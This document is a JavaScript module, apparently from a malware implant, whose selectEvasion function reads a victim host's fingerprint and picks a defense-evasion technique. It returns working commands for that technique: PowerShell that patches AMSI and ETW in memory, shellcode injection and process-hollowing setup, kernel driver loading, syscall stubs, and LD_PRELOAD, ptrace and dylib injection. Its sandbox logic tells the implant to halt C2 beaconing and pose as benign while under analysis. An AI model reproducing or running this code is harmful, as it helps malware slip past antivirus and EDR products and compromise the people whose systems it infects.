const TECHNIQUE_DB = {
  dormant: {
    technique: 'go-dormant',
    description: 'Cease all C2 beaconing, pretend to be a benign process. Stop suspicious API calls and blend into normal system activity.',
    bypassCommands: [],
    riskLevel: 'low',
  },
  amsiBypass: {
    technique: 'amsi-patch-etw',
    description: 'Patch AMSI (AmsiScanBuffer) and ETW (EtwEventWrite) in memory to bypass PowerShell/Microsoft Defender detection.',
    bypassCommands: [
      '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
      '$Win32 = Add-Type -memberDefinition \'[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string lpLibFileName); [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\' -name Win32 -namespace Win32Functions -PassThru; $ptr = $Win32::GetProcAddress($Win32::LoadLibrary("amsi.dll"), "AmsiScanBuffer"); $b = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3); [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $ptr, 6)',
      '$etw = $Win32::GetProcAddress($Win32::LoadLibrary("ntdll.dll"), "EtwEventWrite"); $null = $Win32::VirtualProtect($etw, [UIntPtr]::new(1), 0x40, [ref]0); [System.Runtime.InteropServices.Marshal]::WriteByte($etw, 0xC3)',
    ],
    riskLevel: 'medium',
  },
  shellcodeInjection: {
    technique: 'plain-shellcode-injection',
    description: 'Use CreateProcess/RtlCreateUserThread to inject shellcode into a remote process. No advanced evasion, fast execution.',
    bypassCommands: [
      '$c = Add-Type -memberDefinition \'[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport("kernel32.dll")] public static extern IntPtr WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);\' -name Win32 -namespace Win32Functions -PassThru; $buf = [byte[]](0x90,0x90,0xCC); $ptr = $c::VirtualAlloc(0, [uint32]$buf.Length, 0x3000, 0x40); [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, [IntPtr]$ptr, $buf.Length); $c::CreateThread(0,0,$ptr,0,0,0) | Out-Null',
    ],
    riskLevel: 'low',
  },
  directKernel: {
    technique: 'direct-kernel-calls',
    description: 'Use direct kernel object manipulation (DKOM) or kernel driver calls to bypass user-mode hooks and monitoring.',
    bypassCommands: [
      'sc create tsc-driver binpath= "C:\\Windows\\System32\\drivers\\tsc-kernel.sys" type= kernel start= demand',
      'sc start tsc-driver',
      '# Use NtCreateThreadEx with direct syscall stubs to avoid userland hooks',
    ],
    riskLevel: 'high',
  },
  processHollowing: {
    technique: 'process-hollowing',
    description: 'Create a suspended legitimate process, hollow its memory, and inject payload. Bypasses parent-child anomaly detection.',
    bypassCommands: [
      '$CreateProcess = Add-Type -memberDefinition \'[DllImport("kernel32.dll", SetLastError=true)] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation); [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; } [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }\' -name Hollow -namespace Win32 -PassThru',
      '# Suspend, hollow with NtUnmapViewOfSection, write payload with WriteProcessMemory, set entry point with SetThreadContext, resume',
    ],
    riskLevel: 'medium',
  },
  directSyscalls: {
    technique: 'direct-syscalls',
    description: 'Use Hell\'s Gate / Halo\'s Gate technique to dynamically resolve syscall numbers and call kernel directly, bypassing user-mode hooks.',
    bypassCommands: [
      '# Use Hell\'s Gate to resolve syscall SSNs from ntdll.dll',
      '# Implement in ASM: mov r10, rcx; mov eax, SSN; syscall; ret',
      '# Hell\'s Gate ASM stub: mov r10, rcx; mov eax, SSN; syscall; ret',
    ],
    riskLevel: 'high',
  },
  ldPreload: {
    technique: 'ld-preload-hooking',
    description: 'Use LD_PRELOAD to hook libc functions and intercept file/network operations. Bypasses userland EDR hooks on Linux.',
    bypassCommands: [
      'gcc -shared -fPIC -o hook.so hook.c -ldl',
      'export LD_PRELOAD=$PWD/hook.so',
      './target_binary',
    ],
    riskLevel: 'medium',
  },
  ptraceInjection: {
    technique: 'ptrace-injection',
    description: 'Use ptrace to attach to a process, inject shellcode, and hijack execution flow on Linux systems.',
    bypassCommands: [
      'echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope',
      'gcc -o inject inject.c',
      './inject <target_pid> <shellcode_file>',
    ],
    riskLevel: 'high',
  },
  dylibHijacking: {
    technique: 'dylib-hijacking',
    description: 'Replace or hijack dylib load paths using DYLD_INSERT_LIBRARIES or dylib proxying to achieve code execution on macOS.',
    bypassCommands: [
      'export DYLD_INSERT_LIBRARIES=/path/to/malicious.dylib',
      'export DYLD_FORCE_FLAT_NAMESPACE=1',
      './target_binary',
      '# Or use @rpath/@executable_path hijacking via install_name_tool',
    ],
    riskLevel: 'high',
  },
};

const WIN10_BUILDS = {
  min: 10240,
  max: Infinity,
};

function selectEvasion(fingerprint) {
  const os = fingerprint.os;
  const platform = os.platform;
  const build = parseInt(os.build, 10);
  const arch = fingerprint.architecture;
  const isAdmin = fingerprint.privileges.isAdmin || fingerprint.privileges.isRoot;
  const sandboxScore = fingerprint.sandbox.score;
  const avList = fingerprint.securityProducts.antivirus;
  const edrList = fingerprint.securityProducts.edr;
  const hasDefender = avList.some(a => a.name.includes('Defender'));
  const hasAV = avList.length > 0;

  let selected;

  if (sandboxScore >= 30) {
    selected = { ...TECHNIQUE_DB.dormant };
  } else if (platform === 'linux') {
    selected = { ...TECHNIQUE_DB.ldPreload };
  } else if (platform === 'darwin') {
    selected = { ...TECHNIQUE_DB.dylibHijacking };
  } else if (isAdmin && hasDefender) {
    selected = { ...TECHNIQUE_DB.amsiBypass };
  } else if (isAdmin && (edrList.length > 0 || !hasAV)) {
    selected = { ...TECHNIQUE_DB.directKernel };
  } else if (platform === 'win32' && build >= WIN10_BUILDS.min) {
    selected = { ...TECHNIQUE_DB.directSyscalls };
  } else if (!isAdmin && platform === 'win32') {
    selected = { ...TECHNIQUE_DB.processHollowing };
  } else if (!hasAV) {
    selected = { ...TECHNIQUE_DB.shellcodeInjection };
  } else {
    selected = { ...TECHNIQUE_DB.processHollowing };
  }

  const riskMap = { low: 1, medium: 2, high: 3, extreme: 4 };
  let riskLevel = selected.riskLevel;

  if (edrList.length > 0 && riskMap[riskLevel] < 3) {
    riskLevel = 'high';
  }
  if (edrList.length >= 2) {
    riskLevel = 'extreme';
  }
  if (sandboxScore >= 30) {
    riskLevel = 'low';
  }

  return {
    technique: selected.technique,
    description: selected.description,
    bypassCommands: selected.bypassCommands,
    riskLevel,
    reasoning: buildReasoning(fingerprint, selected.technique, riskLevel),
  };
}

function buildReasoning(fp, technique, risk) {
  const parts = [];
  if (fp.sandbox.score >= 30) parts.push(`Sandbox score ${fp.sandbox.score} — evasive action required`);
  if (fp.securityProducts.antivirus.length > 0) parts.push(`Detected AV: ${fp.securityProducts.antivirus.map(a => a.name).join(', ')}`);
  if (fp.securityProducts.edr.length > 0) parts.push(`Detected EDR: ${fp.securityProducts.edr.map(e => e.name).join(', ')}`);
  if (fp.privileges.isAdmin) parts.push('Running as admin — kernel-level ops available');
  if (fp.privileges.isRoot) parts.push('Running as root — full system access');
  parts.push(`Chosen technique: ${technique} (${risk} risk)`);
  return parts;
}

module.exports = { selectEvasion };
